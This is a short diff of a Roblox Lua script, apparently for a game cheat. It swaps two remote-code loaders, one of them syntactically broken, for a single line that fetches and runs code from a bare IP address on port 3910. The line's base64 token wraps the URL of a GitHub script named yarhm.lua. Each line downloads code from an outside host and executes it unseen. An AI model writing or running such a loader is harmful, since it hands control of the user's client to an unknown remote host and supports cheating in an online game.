@@ -1,7 +1,1 @@
-local function s1()
-loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImMwZWY1NWYzLTU2YjUtNGUyYS04OTc3LWE5ODBkY2Q5ODUxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
-local function s2()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua"))()
-end
-task.spawn(s1)
-task.spawn(s2)
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImMwZWY1NWYzLTU2YjUtNGUyYS04OTc3LWE5ODBkY2Q5ODUxOCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSm95c3RpY2twbGF5cy9wc3ljaGljLW9jdG8taW52ZW50aW9uL21haW4veWFyaG0ubHVhIn19"))()
